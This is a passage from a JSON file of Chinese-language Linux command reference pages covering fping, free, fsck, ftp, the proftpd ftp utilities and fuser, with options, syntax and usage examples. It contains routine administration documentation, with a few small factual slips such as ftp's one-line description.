        "body": "<h1 id=\"fping\">fping</h1>\n<p>fping检测主机是否存在</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fping命令</strong> fping类似于ping，但比ping强大。与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping，fping还可以在命令行中指定要ping的主机数量范围。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fping</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>a  <span class=\"hljs-comment\"># 显示存活的主机</span>\n<span class=\"hljs-literal\">-</span>b  <span class=\"hljs-comment\"># ping 数据包的大小。（默认为56）</span>\n<span class=\"hljs-literal\">-</span>c  <span class=\"hljs-comment\"># ping每个目标的次数 (默认为1)</span>\n<span class=\"hljs-literal\">-</span>f  <span class=\"hljs-comment\"># 从文件获取目标列表(不能与 -g 同时使用)</span>\n<span class=\"hljs-literal\">-</span>l  <span class=\"hljs-comment\"># 循环发送ping</span>\n<span class=\"hljs-literal\">-</span>g  <span class=\"hljs-comment\"># 通过指定开始和结束地址来生成目标列表,可以使网段</span>\n<span class=\"hljs-literal\">-</span>u  <span class=\"hljs-comment\"># 显示不可到达的目标</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>安装fping命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 先安装epel源：</span>\nyum <span class=\"hljs-keyword\">install</span> epel* -y\n<span class=\"hljs-comment\"># 安装fping包：</span>\nyum <span class=\"hljs-keyword\">install</span> fping -y\n</code></pre>\n<p>选择性ping指定ip：</p>\n<pre><code class=\"language-shell\">~]# fping <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">1</span> <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">125</span> <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">126</span> <span class=\"hljs-number\">2</span>&gt;/dev/null\n<span class=\"hljs-number\">192.168.0.1</span> is alive\n<span class=\"hljs-number\">192.168.0.125</span> is alive\n<span class=\"hljs-number\">192.168.0.126</span> is unreachable\n</code></pre>\n<p>ping整个网段：</p>\n<pre><code class=\"language-bash\">~]# fping -g <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">2</span>&gt;/dev/null\n<span class=\"hljs-number\">192.168.0.1</span> is alive\n<span class=\"hljs-number\">192.168.0.103</span> is alive\n...\n<span class=\"hljs-number\">192.168.0.253</span> is unreachable\n<span class=\"hljs-number\">192.168.0.254</span> is unreachable\n</code></pre>\n<p>ping整个网段，只显示存活的主机：</p>\n<pre><code class=\"language-shell\">~]# fping -ag <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">2</span>&gt;/dev/null\n<span class=\"hljs-number\">192.168.0.1</span>\n<span class=\"hljs-number\">192.168.0.103</span>\n...\n</code></pre>\n<p>ping某一段ip：</p>\n<pre><code class=\"language-shell\">~]# fping -ag <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">5</span> <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">130</span> <span class=\"hljs-number\">2</span>&gt;/dev/null\n<span class=\"hljs-number\">192.168.0.103</span>\n...\n<span class=\"hljs-number\">192.168.0.125</span>\n<span class=\"hljs-number\">192.168.0.130</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n\n"
    },
    {
        "title": "free",
        "des": "显示内存的使用情况",
        "body": "<h1 id=\"free\">free</h1>\n<p>显示内存的使用情况</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>free命令</strong> 可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">free</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>b <span class=\"hljs-comment\"># 以Byte为单位显示内存使用情况；</span>\n<span class=\"hljs-literal\">-</span>k <span class=\"hljs-comment\"># 以KB为单位显示内存使用情况；</span>\n<span class=\"hljs-literal\">-</span>m <span class=\"hljs-comment\"># 以MB为单位显示内存使用情况；</span>\n<span class=\"hljs-literal\">-</span>g <span class=\"hljs-comment\"># 以GB为单位显示内存使用情况。 </span>\n<span class=\"hljs-literal\">-</span>o <span class=\"hljs-comment\"># 不显示缓冲区调节列；</span>\n<span class=\"hljs-literal\">-</span>s&lt;间隔秒数&gt; <span class=\"hljs-comment\"># 持续观察内存使用状况；</span>\n<span class=\"hljs-literal\">-</span>t <span class=\"hljs-comment\"># 显示内存总和列；</span>\n<span class=\"hljs-literal\">-</span>V <span class=\"hljs-comment\"># 显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">free</span> -t    <span class=\"hljs-comment\"># 以总和的形式显示内存的使用信息</span>\nfree -s <span class=\"hljs-number\">10</span> <span class=\"hljs-comment\"># 周期性的查询内存使用信息，每10s 执行一次命令</span>\n</code></pre>\n<p>显示内存使用情况</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">free</span> <span class=\"hljs-string\">-m</span>\n             <span class=\"hljs-string\">total</span>       <span class=\"hljs-string\">used</span>       <span class=\"hljs-string\">free</span>     <span class=\"hljs-string\">shared</span>    <span class=\"hljs-string\">buffers</span>     <span class=\"hljs-string\">cached</span>\n<span class=\"hljs-attr\">Mem:</span>          <span class=\"hljs-number\">2016       </span><span class=\"hljs-number\">1973         </span><span class=\"hljs-number\">42</span>          <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">163</span>       <span class=\"hljs-number\">1497</span>\n<span class=\"hljs-string\">-/+</span> <span class=\"hljs-attr\">buffers/cache:</span>        <span class=\"hljs-number\">312</span>       <span class=\"hljs-number\">1703</span>\n<span class=\"hljs-attr\">Swap:</span>         <span class=\"hljs-number\">4094          </span><span class=\"hljs-number\">0</span>       <span class=\"hljs-number\">4094</span>\n</code></pre>\n<p> <strong>第一部分Mem行解释：</strong> </p>\n<pre><code class=\"language-shell\">total：内存总数；\nused：已经使用的内存数；\nfree：空闲的内存数；\n<span class=\"hljs-keyword\">shared：当前已经废弃不用；\n</span><span class=\"hljs-keyword\">buffers </span><span class=\"hljs-keyword\">Buffer：缓存内存数；\n</span><span class=\"hljs-keyword\">cached </span>Page：缓存内存数。\n</code></pre>\n<p>关系：total = used + free</p>\n<p> <strong>第二部分(-/+ buffers/cache)解释:</strong> </p>\n<pre><code class=\"language-shell\">(-<span class=\"hljs-keyword\">buffers/cache) </span>used内存数：第一部分Mem行中的 used – <span class=\"hljs-keyword\">buffers </span>– <span class=\"hljs-keyword\">cached\n</span>(+<span class=\"hljs-keyword\">buffers/cache) </span>free内存数: 第一部分Mem行中的 free + <span class=\"hljs-keyword\">buffers </span>+ <span class=\"hljs-keyword\">cached</span>\n</code></pre>\n<p>可见-buffers/cache反映的是被程序实实在在吃掉的内存，而+buffers/cache反映的是可以挪用的内存总数。</p>\n<p>第三部分是指交换分区。</p>\n<p>输出结果的第四行是交换分区SWAP的，也就是我们通常所说的虚拟内存。\n区别：第二行(mem)的used/free与第三行(-/+ buffers/cache) used/free的区别。 这两个的区别在于使用的角度来看，第一行是从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是2098428KB,已用内存是30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc)使用的+buffers+cached.</p>\n<p>第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。</p>\n<p>所以从应用程序的角度来说，可用内存=系统free memory+buffers+cached。\n如本机情况的可用内存为：</p>\n<p>18007156=2098428KB+4545340KB+11363424KB</p>\n<p>接下来解释什么时候内存会被交换，以及按什么方交换。 </p>\n<p>当可用内存少于额定值的时候，就会开会进行交换。如何看额定值：</p>\n<pre><code class=\"language-shell\">cat /<span class=\"hljs-keyword\">proc</span>/meminfo<span class=\"hljs-title\">\n\nMemTotal:</span>       16140816<span class=\"hljs-title\"> kB</span>\nMemFree:          816004<span class=\"hljs-title\"> kB</span>\nMemAvailable:    2913824<span class=\"hljs-title\"> kB</span>\nBuffers:           17912<span class=\"hljs-title\"> kB</span>\nCached:          2239076<span class=\"hljs-title\"> kB</span>\nSwapCached:            0<span class=\"hljs-title\"> kB</span>\nActive:         12774804<span class=\"hljs-title\"> kB</span>\nInactive:        1594328<span class=\"hljs-title\"> kB</span>\nActive(anon):   12085544<span class=\"hljs-title\"> kB</span>\nInactive(anon):    94572<span class=\"hljs-title\"> kB</span>\nActive(file):     689260<span class=\"hljs-title\"> kB</span>\nInactive(file):  1499756<span class=\"hljs-title\"> kB</span>\nUnevictable:      116888<span class=\"hljs-title\"> kB</span>\nMlocked:          116888<span class=\"hljs-title\"> kB</span>\nSwapTotal:       8191996<span class=\"hljs-title\"> kB</span>\nSwapFree:        8191996<span class=\"hljs-title\"> kB</span>\nDirty:                56<span class=\"hljs-title\"> kB</span>\nWriteback:             0<span class=\"hljs-title\"> kB</span>\nAnonPages:      12229228<span class=\"hljs-title\"> kB</span>\nMapped:           117136<span class=\"hljs-title\"> kB</span>\nShmem:             58736<span class=\"hljs-title\"> kB</span>\nSlab:             395568<span class=\"hljs-title\"> kB</span>\nSReclaimable:     246700<span class=\"hljs-title\"> kB</span>\nSUnreclaim:       148868<span class=\"hljs-title\"> kB</span>\nKernelStack:       30496<span class=\"hljs-title\"> kB</span>\nPageTables:       165104<span class=\"hljs-title\"> kB</span>\nNFS_Unstable:          0<span class=\"hljs-title\"> kB</span>\nBounce:                0<span class=\"hljs-title\"> kB</span>\nWritebackTmp:          0<span class=\"hljs-title\"> kB</span>\nCommitLimit:    16262404<span class=\"hljs-title\"> kB</span>\nCommitted_AS:   27698600<span class=\"hljs-title\"> kB</span>\nVmallocTotal:   34359738367<span class=\"hljs-title\"> kB</span>\nVmallocUsed:      311072<span class=\"hljs-title\"> kB</span>\nVmallocChunk:   34350899200<span class=\"hljs-title\"> kB</span>\nHardwareCorrupted:     0<span class=\"hljs-title\"> kB</span>\nAnonHugePages:   3104768<span class=\"hljs-title\"> kB</span>\nHugePages_Total:       0<span class=\"hljs-title\">\nHugePages_Free:</span>        0<span class=\"hljs-title\">\nHugePages_Rsvd:</span>        0<span class=\"hljs-title\">\nHugePages_Surp:</span>        0<span class=\"hljs-title\">\nHugepagesize:</span>       2048<span class=\"hljs-title\"> kB</span>\nDirectMap4k:      225536<span class=\"hljs-title\"> kB</span>\nDirectMap2M:    13279232<span class=\"hljs-title\"> kB</span>\nDirectMap1G:     5242880<span class=\"hljs-title\"> kB</span>\n</code></pre>\n<p>交换将通过三个途径来减少系统中使用的物理页面的个数：　</p>\n<ol>\n<li>减少缓冲与页面cache的大小， </li>\n<li>将系统V类型的内存页面交换出去，　 </li>\n<li>换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 </li>\n</ol>\n<p>事实上，少量地使用swap是不是影响到系统性能的。</p>\n<p>那buffers和cached都是缓存，两者有什么区别呢？</p>\n<p>为了提高磁盘存取效率, Linux做了一些精心的设计, 除了对dentry进行缓存(用于VFS,加速文件路径名到inode的转换), 还采取了两种主要Cache方式：</p>\n<p>Buffer Cache和Page Cache。前者针对磁盘块的读写，后者针对文件inode的读写。这些Cache有效缩短了 I/O系统调用(比如read,write,getdents)的时间。\n磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。</p>\n<p>Page cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，因为Buffer Cache就是缓存磁盘块的。但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。</p>\n<p>Buffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。</p>\n<p>简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。</p>\n<p>所以我们看linux,只要不用swap的交换空间,就不用担心自己的内存太少.如果常常swap用很多,可能你就要考虑加物理内存了.这也是linux看内存是否够用的标准.</p>\n<p>如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说free的内存太少了，也是该考虑优化程序或加内存了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "fsck",
        "des": "检查并且试图修复文件系统中的错误",
        "body": "<h1 id=\"fsck\">fsck</h1>\n<p>检查并且试图修复文件系统中的错误</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fsck命令</strong> 被用于检查并且试图修复文件系统中的错误。当文件系统发生错误四化，可用fsck指令尝试加以修复。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fsck</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：自动修复文件系统，不询问任何问题；</span>\n<span class=\"hljs-deletion\">-A：依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统；</span>\n<span class=\"hljs-deletion\">-N：不执行指令，仅列出实际执行会进行的动作；</span>\n<span class=\"hljs-deletion\">-P：当搭配\"-A\"参数使用时，则会同时检查所有的文件系统；</span>\n<span class=\"hljs-deletion\">-r：采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式；</span>\n<span class=\"hljs-deletion\">-R：当搭配\"-A\"参数使用时，则会略过/目录的文件系统不予检查；</span>\n<span class=\"hljs-deletion\">-s：依序执行检查作业，而非同时执行；</span>\n<span class=\"hljs-deletion\">-t&lt;文件系统类型&gt;：指定要检查的文件系统类型；</span>\n<span class=\"hljs-deletion\">-T：执行fsck指令时，不显示标题信息；</span>\n<span class=\"hljs-deletion\">-V：显示指令执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要查看信息的文件系统。</p>\n<h3 id=\"实例\">实例</h3>\n<p>linux的文件系统损坏会导致linux不正常关机，出错的时候如果系统告诉你是哪一块硬盘的分区有问题，比如是<code>/dev/hda2</code>，接着用如下的命令去对付它：</p>\n<pre><code class=\"language-shell\">fsck -y <span class=\"hljs-regexp\">/dev/</span>hda2\n</code></pre>\n<p>结束后使用reboot命令重启系统这样就好了！</p>\n<p>如果不知道时哪个地方出了问题，可以直接：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">fsck</span>\n</code></pre>\n<p>在随后的多个确认对话框中输入<code>:y</code></p>\n<p>结束后同样使用reboot命令重启系统这样就好了！</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ftp",
        "des": "用来设置文件系统相关功能",
        "body": "<h1 id=\"ftp\">ftp</h1>\n<p>用来设置文件系统相关功能</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ftp命令</strong> 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ftp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：详细显示指令执行过程，便于排错或分析程序执行的情况；</span>\n<span class=\"hljs-deletion\">-i：关闭互动模式，不询问任何问题；</span>\n<span class=\"hljs-deletion\">-g：关闭本地主机文件名称支持特殊字符的扩充特性；</span>\n<span class=\"hljs-deletion\">-n：不使用自动登录；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：指定要连接的FTP服务器的主机名或ip地址。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">ascii  <span class=\"hljs-comment\"># 设定以ASCII方式传送文件(缺省值)</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">bell   <span class=\"hljs-comment\"># 每完成一次文件传送,报警提示.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">binary <span class=\"hljs-comment\"># 设定以二进制方式传送文件.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\"><span class=\"hljs-built_in\">bye</span>    <span class=\"hljs-comment\"># 终止主机FTP进程,并退出FTP管理方式.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\"><span class=\"hljs-keyword\">case</span>   <span class=\"hljs-comment\"># 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\"><span class=\"hljs-built_in\">cd</span>     <span class=\"hljs-comment\"># 同UNIX的CD命令.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">cdup   <span class=\"hljs-comment\"># 返回上一级目录.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">chmod  <span class=\"hljs-comment\"># 改变远端主机的文件权限.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">close  <span class=\"hljs-comment\"># 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">delete <span class=\"hljs-comment\"># 删除远端主机中的文件.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">dir [remote-directory] [local-file] <span class=\"hljs-comment\"># 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">get [remote-file] [local-file] <span class=\"hljs-comment\"># 从远端主机中传送至本地主机中.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\"><span class=\"hljs-built_in\">help</span> [<span class=\"hljs-built_in\">command</span>] <span class=\"hljs-comment\"># 输出命令的解释.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">lcd <span class=\"hljs-comment\"># 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">ls [remote-directory] [local-file] <span class=\"hljs-comment\"># 同DIR.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">macdef                 <span class=\"hljs-comment\"># 定义宏命令.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">mdelete [remote-files] <span class=\"hljs-comment\"># 删除一批文件.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">mget [remote-files]    <span class=\"hljs-comment\"># 从远端主机接收一批文件至本地主机.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">mkdir directory-name   <span class=\"hljs-comment\"># 在远端主机中建立目录.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">mput local-files <span class=\"hljs-comment\"># 将本地主机中一批文件传送至远端主机.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">open host [port] <span class=\"hljs-comment\"># 重新建立一个新的连接.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">prompt           <span class=\"hljs-comment\"># 交互提示模式.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">put local-file [remote-file] <span class=\"hljs-comment\"># 将本地一个文件传送至远端主机中.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\"><span class=\"hljs-built_in\">pwd</span>  <span class=\"hljs-comment\"># 列出当前远端主机目录.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">quit <span class=\"hljs-comment\"># 同BYE.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">recv remote-file [local-file] <span class=\"hljs-comment\"># 同GET.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">rename [from] [to]     <span class=\"hljs-comment\"># 改变远端主机中的文件名.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">rmdir directory-name   <span class=\"hljs-comment\"># 删除远端主机中的目录.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">send local-file [remote-file] <span class=\"hljs-comment\"># 同PUT.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">status   <span class=\"hljs-comment\"># 显示当前FTP的状态.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">system   <span class=\"hljs-comment\"># 显示远端主机系统类型.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">user user-name [password] [account] <span class=\"hljs-comment\"># 重新以别的用户名登录远端主机.</span></span> \n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">? [<span class=\"hljs-built_in\">command</span>] <span class=\"hljs-comment\"># 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。</span></span>\n<span class=\"hljs-meta\">ftp&gt; </span><span class=\"language-bash\">! <span class=\"hljs-comment\"># 从 ftp 子系统退出到外壳。</span></span>\n</code></pre>\n<p>FTP 匿名登录账号密码</p>\n<pre><code class=\"language-shell\">账号：anonymous\n密码: <span class=\"hljs-symbol\">anonymous@</span>\n</code></pre>\n<p>关闭FTP连接</p>\n<pre><code class=\"language-shell\">bye\n<span class=\"hljs-keyword\">exit</span>\nquit\n</code></pre>\n<p>下载文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ftp</span>&gt; <span class=\"hljs-built_in\">get</span> readme.txt <span class=\"hljs-comment\"># 下载 readme.txt 文件</span>\n<span class=\"hljs-keyword\">ftp</span>&gt; mget *.txt     <span class=\"hljs-comment\"># 下载 </span>\n</code></pre>\n<p>上传文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ftp</span>&gt; <span class=\"hljs-built_in\">put</span> /path/readme.txt <span class=\"hljs-comment\"># 上传 readme.txt 文件</span>\n<span class=\"hljs-keyword\">ftp</span>&gt; mput *.txt           <span class=\"hljs-comment\"># 可以上传多个文件</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ftpcount",
        "des": "显示目前已FTP登入的用户人数",
        "body": "<h1 id=\"ftpcount\">ftpcount</h1>\n<p>显示目前已FTP登入的用户人数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>显示目前已ftp登入的用户人数。执行这项指令可得知目前用FTP登入系统的人数以及FTP登入人数的上限。</p>\n<p>语法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ftpcount</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ftpshut",
        "des": "在指定的时间关闭FTP服务器",
        "body": "<h1 id=\"ftpshut\">ftpshut</h1>\n<p>在指定的时间关闭FTP服务器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>功能说明：在指定的时间关闭ftp服务器。本指令提供系统管理者在设置的时间关闭FTP服务器，且能在关闭之前发出警告信息通知用户。关闭时间若设置后为\"none\"，则会马上关闭服务器。如果采 用\"+30\"的方式来设置表示服务器在30分钟之后关闭。依次类推，假设使用\"1130\"的格式则代表服务器会在每日的11时30分关闭，时间格式为24 小时制。FTP服务器关闭后，在/etc目录下会产生一个名称为shutmsg的文件，把它删除后即可再度启动FTP服务器的功能。</p>\n<p>语法：</p>\n<pre><code class=\"language-shell\">ftpshut <span class=\"hljs-selector-attr\">[-d&lt;分钟&gt;]</span><span class=\"hljs-selector-attr\">[-l&lt;分钟&gt;]</span><span class=\"hljs-selector-attr\">[关闭时间]</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">\"警告信息\"</span>]</span>\n</code></pre>\n<p>参数：</p>\n<pre><code class=\"language-shell\">-d<span class=\"hljs-attribute\">&lt;分钟&gt;</span>   切断所有FTP连线时间。\n-l<span class=\"hljs-attribute\">&lt;分钟&gt;</span>   停止接受FTP登入的时间。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ftptop",
        "des": "proftpd服务器的连接状态",
        "body": "<h1 id=\"ftptop\">ftptop</h1>\n<p>proftpd服务器的连接状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ftptop命令</strong> 类似于top命令的显示风格显示proftpd服务器的连接状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ftptop</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-D：过滤正在下载的会话；</span>\n<span class=\"hljs-deletion\">-S：仅显示指定虚拟主机的连接状态；</span>\n<span class=\"hljs-deletion\">-d：指定屏幕刷新时间，默认</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ftpwho",
        "des": "显示当前每个ftp会话信息",
        "body": "<h1 id=\"ftpwho\">ftpwho</h1>\n<p>显示当前每个ftp会话信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ftpwho命令</strong> ftp服务器套件proftpd的工作指令，用于显示当前每个ftp会话信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ftpwho</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-v：详细模式，输出更多信息。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "fuser",
        "des": "使用文件或文件结构识别进程",
        "body": "<h1 id=\"fuser\">fuser</h1>\n<p>使用文件或文件结构识别进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fuser命令</strong> 用于报告进程使用的文件和网络套接字。fuser命令列出了本地进程的进程号，那些本地进程使用file，参数指定的本地或远程文件。对于阻塞特别设备，此命令列出了使用该设备上任何文件的进程。</p>\n<p>每个进程号后面都跟随一个字母，该字母指示进程如何使用文件。</p>\n<ul>\n<li><code>c</code> ：指示进程的工作目录。</li>\n<li><code>e</code> ：指示该文件为进程的可执行文件(即进程由该文件拉起)。</li>\n<li><code>f</code> ：指示该文件被进程打开，默认情况下f字符不显示。</li>\n<li><code>F</code> ：指示该文件被进程打开进行写入，默认情况下F字符不显示。</li>\n<li><code>r</code> ：指示该目录为进程的根目录。</li>\n<li><code>m</code> ：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存。</li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fuser</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示命令行中指定的所有文件；</span>\n<span class=\"hljs-deletion\">-k：杀死访问指定文件的所有进程；</span>\n<span class=\"hljs-deletion\">-i：杀死进程前需要用户进行确认；</span>\n<span class=\"hljs-deletion\">-l：列出所有已知信号名；</span>\n<span class=\"hljs-deletion\">-m：指定一个被加载的文件系统或一个被加载的块设备；</span>\n<span class=\"hljs-deletion\">-n：选择不同的名称空间；</span>\n<span class=\"hljs-deletion\">-u：在每个进程后显示所属的用户名。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：可以是文件名或者TCP、UDP端口号。</p>\n<h3 